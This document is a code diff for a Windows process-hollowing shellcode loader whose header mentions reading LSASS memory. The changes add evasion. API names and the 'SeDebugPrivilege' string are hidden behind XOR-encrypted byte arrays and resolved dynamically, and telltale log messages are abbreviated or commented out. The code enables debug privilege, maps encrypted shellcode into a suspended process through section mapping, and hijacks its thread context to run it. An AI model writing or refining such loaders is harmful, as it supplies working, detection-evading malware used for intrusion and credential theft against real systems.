@@ -37,41 +37,6 @@ void xor_decrypt_buffer(unsigned char* buffer, size_t len, const char* key, size
     }
 }
 
-// "CreateProcessW"
-static const unsigned char CPW_ENC[] = {
-    0x73, 0x43, 0x57, 0x52, 0x40, 0x50, 0x66, 0x45, 0x57, 0x5A, 0x04, 0x11, 0x10, 0x33
-};
-
-// "ResumeThread"
-static const unsigned char RT_ENC[] = {
-    0x62, 0x54, 0x41, 0x46, 0x59, 0x50, 0x62, 0x5F, 0x4A, 0x5C, 0x00, 0x06
-};
-
-// "NtCreateSection"
-static const unsigned char NTCS_ENC[] = {
-    0x7E, 0x45, 0x71, 0x41, 0x51, 0x54, 0x42, 0x52, 0x6B, 0x5C, 0x02, 0x16, 0x0A, 0x0B, 0x0B
-};
-
-// "NtMapViewOfSection"
-static const unsigned char NTMVS_ENC[] = {
-    0x7E, 0x45, 0x7F, 0x52, 0x44, 0x63, 0x5F, 0x52, 0x4F, 0x76, 0x07, 0x31, 0x06, 0x07, 0x11, 0x0F, 0x08, 0x06
-};
-
-// "OpenProcessToken"
-static const unsigned char OPT_ENC[] = {
-    0x7F, 0x41, 0x57, 0x5D, 0x64, 0x47, 0x59, 0x54, 0x5D, 0x4A, 0x12, 0x36, 0x0C, 0x0F, 0x00, 0x08
-};
-
-// "AdjustTokenPrivileges"
-static const unsigned char ATP_ENC[] = {
-    0x71, 0x55, 0x58, 0x46, 0x47, 0x41, 0x62, 0x58, 0x53, 0x5C, 0x0F, 0x32, 0x11, 0x0D, 0x13, 0x0F, 0x0B, 0x0D, 0x0E, 0x0F, 0x43
-};
-
-// "LookupPrivilegeValueA"
-static const unsigned char LPVA_ENC[] = {
-    0x7C, 0x5E, 0x5D, 0x58, 0x41, 0x45, 0x66, 0x45, 0x51, 0x4F, 0x08, 0x0E, 0x06, 0x03, 0x00, 0x30, 0x06, 0x04, 0x1C, 0x0F, 0x71
-};
-
 // to_wide util function
 
 wchar_t* to_wide(const char* str) {
@@ -91,7 +56,7 @@ HMODULE LoadCleanDLL(char* dllPath) {
     HMODULE hDLL = LoadLibraryA(dllPath);
     if (hDLL)
     {
-        printf("[+] Loaded clean copy of %s at: %p\n", dllPath, hDLL);
+        // printf("[+] Loaded clean copy of %s at: %p\n", dllPath, hDLL);
     }
     else
     {
@@ -151,7 +116,7 @@ FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
             WORD ordinal = addressOfNameOrdinals[i];
             // Get the RVA of the function
             DWORD functionRVA = addressOfFunctions[ordinal];
-            printf("[+] Found %s at ordinal %hu, RVA: 0x%08X\n", lpProcName, ordinal, functionRVA);
+            // printf("[+] Found %s at ordinal %hu, RVA: 0x%08X\n", lpProcName, ordinal, functionRVA);
             // Return the absolute address of the function
             return (FARPROC)(baseAddr + functionRVA);
         }
@@ -166,6 +131,56 @@ FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
 // =====================================================
 
 // Loading API
+
+// "CreateProcessW"
+static const unsigned char CPW_ENC[] = {
+    0x73, 0x43, 0x57, 0x52, 0x40, 0x50, 0x66, 0x45, 0x57, 0x5A, 0x04, 0x11, 0x10, 0x33
+};
+
+// "ResumeThread"
+static const unsigned char RT_ENC[] = {
+    0x62, 0x54, 0x41, 0x46, 0x59, 0x50, 0x62, 0x5F, 0x4A, 0x5C, 0x00, 0x06
+};
+
+// "NtCreateSection"
+static const unsigned char NTCS_ENC[] = {
+    0x7E, 0x45, 0x71, 0x41, 0x51, 0x54, 0x42, 0x52, 0x6B, 0x5C, 0x02, 0x16, 0x0A, 0x0B, 0x0B
+};
+
+// "NtMapViewOfSection"
+static const unsigned char NTMVS_ENC[] = {
+    0x7E, 0x45, 0x7F, 0x52, 0x44, 0x63, 0x5F, 0x52, 0x4F, 0x76, 0x07, 0x31, 0x06, 0x07, 0x11, 0x0F, 0x08, 0x06
+};
+
+// "OpenProcessToken"
+static const unsigned char OPT_ENC[] = {
+    0x7F, 0x41, 0x57, 0x5D, 0x64, 0x47, 0x59, 0x54, 0x5D, 0x4A, 0x12, 0x36, 0x0C, 0x0F, 0x00, 0x08
+};
+
+// "AdjustTokenPrivileges"
+static const unsigned char ATP_ENC[] = {
+    0x71, 0x55, 0x58, 0x46, 0x47, 0x41, 0x62, 0x58, 0x53, 0x5C, 0x0F, 0x32, 0x11, 0x0D, 0x13, 0x0F, 0x0B, 0x0D, 0x0E, 0x0F, 0x43
+};
+
+// "LookupPrivilegeValueA"
+static const unsigned char LPVA_ENC[] = {
+    0x7C, 0x5E, 0x5D, 0x58, 0x41, 0x45, 0x66, 0x45, 0x51, 0x4F, 0x08, 0x0E, 0x06, 0x03, 0x00, 0x30, 0x06, 0x04, 0x1C, 0x0F, 0x71
+};
+
+// "GetThreadContext"
+static const unsigned char GTC_ENC[] = {
+    0x77, 0x54, 0x46, 0x67, 0x5C, 0x47, 0x53, 0x56, 0x5C, 0x7A, 0x0E, 0x0C, 0x17, 0x01, 0x1D, 0x12
+};
+
+// "SetThreadContext"
+static const unsigned char STC_ENC[] = {
+    0x63, 0x54, 0x46, 0x67, 0x5C, 0x47, 0x53, 0x56, 0x5C, 0x7A, 0x0E, 0x0C, 0x17, 0x01, 0x1D, 0x12
+};
+
+// "GetCurrentProcess"
+static const unsigned char GCP_ENC[] = {
+    0x77, 0x54, 0x46, 0x70, 0x41, 0x47, 0x44, 0x52, 0x56, 0x4D, 0x31, 0x10, 0x0C, 0x07, 0x00, 0x15, 0x14
+};
 
 typedef BOOL(WINAPI* PFN_OPT)(
     HANDLE ProcessHandle,
@@ -228,6 +243,20 @@ typedef NTSTATUS(NTAPI* PFN_NTMVOS)(
     ULONG Win32Protect
     );
 
+typedef BOOL(WINAPI* PFN_GTC)(
+    HANDLE hThread,
+    LPCONTEXT lpContext
+    );
+
+typedef BOOL(WINAPI* PFN_STC)(
+    HANDLE hThread,
+    const CONTEXT* lpContext
+    );
+
+typedef HANDLE(WINAPI* PFN_GCP)(
+    VOID
+    );
+
 // =====================================================
 // Main – Process Hollowing + LSASS EPROCESS Reading
 // =====================================================
@@ -263,8 +292,11 @@ int main(int argc, char* argv[]) {
     char* strOPT = (char*)malloc(sizeof(OPT_ENC));
     char* strATP = (char*)malloc(sizeof(ATP_ENC));
     char* strLPVA = (char*)malloc(sizeof(LPVA_ENC));
+    char* strGTC = (char*)malloc(sizeof(GTC_ENC));
+    char* strSTC = (char*)malloc(sizeof(STC_ENC));
+    char* strGCP = (char*)malloc(sizeof(GCP_ENC));
 
-    if (!strCPW || !strRT || !strNTCS || !strNTMVS || !strOPT || !strATP || !strLPVA) {
+    if (!strCPW || !strRT || !strNTCS || !strNTMVS || !strOPT || !strATP || !strLPVA || !strGTC || !strSTC || !strGCP) {
         printf("[ERROR] Memory allocation error\n");
         return 1;
     }
@@ -307,6 +339,21 @@ int main(int argc, char* argv[]) {
     PFN_LPVA pLPVA = (PFN_LPVA)CustomGetProcAddress(hAdvapi32, strLPVA);
     SecureZeroMemory(strLPVA, sizeof(LPVA_ENC)); free(strLPVA);
 
+    memcpy(strGTC, GTC_ENC, sizeof(GTC_ENC));
+    strGTC = xor_decrypt_string((unsigned char*)strGTC, sizeof(GTC_ENC), XOR_KEY, key_len);
+    PFN_GTC pGTC = (PFN_GTC)CustomGetProcAddress(hKernel32, strGTC);
+    SecureZeroMemory(strGTC, sizeof(GTC_ENC)); free(strGTC);
+
+    memcpy(strSTC, STC_ENC, sizeof(STC_ENC));
+    strSTC = xor_decrypt_string((unsigned char*)strSTC, sizeof(STC_ENC), XOR_KEY, key_len);
+    PFN_STC pSTC = (PFN_STC)CustomGetProcAddress(hKernel32, strSTC);
+    SecureZeroMemory(strSTC, sizeof(STC_ENC)); free(strSTC);
+
+    memcpy(strGCP, GCP_ENC, sizeof(GCP_ENC));
+    strGCP = xor_decrypt_string((unsigned char*)strGCP, sizeof(GCP_ENC), XOR_KEY, key_len);
+    PFN_GCP pGCP = (PFN_GCP)CustomGetProcAddress(hKernel32, strGCP);
+    SecureZeroMemory(strGCP, sizeof(GCP_ENC)); free(strGCP);
+
     // Check all resolved
     if (!pCPW || !pRT || !pNCS || !pNMVOS || !pOPT || !pATP || !pLPVA) {
         printf("[ERROR] Error retrieving API addresses.\n");
@@ -319,27 +366,42 @@ int main(int argc, char* argv[]) {
     LUID luid;
     TOKEN_PRIVILEGES tp;
 
-    printf("[*] Requesting SeDebugPrivilege...\n");
-    if (!pOPT(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        printf("[!] OpenProcessToken failed, error: %lu\n", GetLastError());
+    printf("[*] Requesting S DBG PVG...\n");
+    if (!pOPT(pGCP(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        printf("[!] OPT failed, error: %lu\n", GetLastError());
         return 1;
     }
-    if (!pLPVA(NULL, "SeDebugPrivilege", &luid)) {
-        printf("[!] LookupPrivilegeValue failed, error: %lu\n", GetLastError());
+
+    // "SeDebugPrivilege"
+    static const unsigned char SEDBG_ENC[] = {
+        0x63, 0x54, 0x76, 0x56, 0x56, 0x40, 0x51, 0x67, 0x4A, 0x50, 0x17, 0x0B, 0x0F, 0x01, 0x02, 0x03
+    };
+
+    char* strSEDBG = (char*)malloc(sizeof(SEDBG_ENC));
+    if (!strSEDBG) {
+        printf("[ERROR] Memory allocation failed for SeDebugPrivilege\n");
+        return 1;
+    }
+    memcpy(strSEDBG, SEDBG_ENC, sizeof(SEDBG_ENC));
+    strSEDBG = xor_decrypt_string((unsigned char*)strSEDBG, sizeof(SEDBG_ENC), XOR_KEY, key_len);
+
+
+    if (!pLPVA(NULL, strSEDBG, &luid)) {
+        printf("[!] LPVA failed, error: %lu\n", GetLastError());
         return 1;
     }
     tp.PrivilegeCount = 1;
     tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
     tp.Privileges->Luid = luid;
     if (!pATP(hToken, FALSE, &tp, 0, NULL, NULL)) {
-        printf("[!] AdjustTokenPrivileges failed, error: %lu\n", GetLastError());
+        printf("[!] ATP failed, error: %lu\n", GetLastError());
         return 1;
     }
     if (GetLastError() != ERROR_SUCCESS) {
-        printf("[!] AdjustTokenPrivileges reported an error: %lu\n", GetLastError());
+        printf("[!] ATP reported an error: %lu\n", GetLastError());
         return 1;
     }
-    printf("[+] SeDebugPrivilege enabled.\n");
+    printf("[+] S DBG PVG enabled.\n");
 
     // Obtain the target executable path (from command line or stdin)
     char exePathA[MAX_PATH] = { 0 };
@@ -378,7 +440,7 @@ int main(int argc, char* argv[]) {
         return 1;
     }
     free(exePathW);
-    printf("[+] Process created (not in suspended state), PID: %lu\n", pi.dwProcessId);
+    printf("[+] Process created in suspended state, PID: %lu\n", pi.dwProcessId);
 
     // Deobfuscate the shellcode
     unsigned char shellcode_enc[] = {
@@ -393,16 +455,16 @@ int main(int argc, char* argv[]) {
     sectionSize.QuadPart = shellcode_len;
     NTSTATUS status = pNCS(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
     if (status != 0 || !hSection) {
-        printf("[ERROR] NtCreateSection failed: 0x%08X\n", status);
+        printf("[ERROR] NCS failed: 0x%08X\n", status);
         return 1;
     }
 
     // Map section to local process
     PVOID localBaseAddress = NULL;
     SIZE_T viewSize = 0;
-    status = pNMVOS(hSection, GetCurrentProcess(), &localBaseAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
+    status = pNMVOS(hSection, pGCP(), &localBaseAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
     if (status != 0 || !localBaseAddress) {
-        printf("[ERROR] NtMapViewOfSection (local) failed: 0x%08X\n", status);
+        printf("[ERROR] NMVOS (local) failed: 0x%08X\n", status);
         return 1;
     }
     memcpy(localBaseAddress, shellcode_enc, shellcode_len);
@@ -412,7 +474,7 @@ int main(int argc, char* argv[]) {
     viewSize = 0;
     status = pNMVOS(hSection, pi.hProcess, &remoteBaseAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);
     if (status != 0 || !remoteBaseAddress) {
-        printf("[ERROR] NtMapViewOfSection (remote) failed: 0x%08X\n", status);
+        printf("[ERROR] NMVOS (remote) failed: 0x%08X\n", status);
         return 1;
     }
     printf("[+] Shellcode mapped at remote address: %p\n", remoteBaseAddress);
@@ -420,8 +482,8 @@ int main(int argc, char* argv[]) {
     // Modify RIP to point to shellcode in remote process
     CONTEXT ctx;
     ctx.ContextFlags = CONTEXT_CONTROL;
-    if (!GetThreadContext(pi.hThread, &ctx)) {
-        printf("[ERROR] GetThreadContext failed: %lu\n", GetLastError());
+    if (!pGTC(pi.hThread, &ctx)) {
+        printf("[ERROR] GTC failed: %lu\n", GetLastError());
         return 1;
     }
 #ifdef _WIN64
@@ -429,8 +491,8 @@ int main(int argc, char* argv[]) {
 #else
     ctx.Eip = (DWORD)remoteBaseAddress;
 #endif
-    if (!SetThreadContext(pi.hThread, &ctx)) {
-        printf("[ERROR] SetThreadContext failed: %lu\n", GetLastError());
+    if (!pSTC(pi.hThread, &ctx)) {
+        printf("[ERROR] STC failed: %lu\n", GetLastError());
         return 1;
     }
 
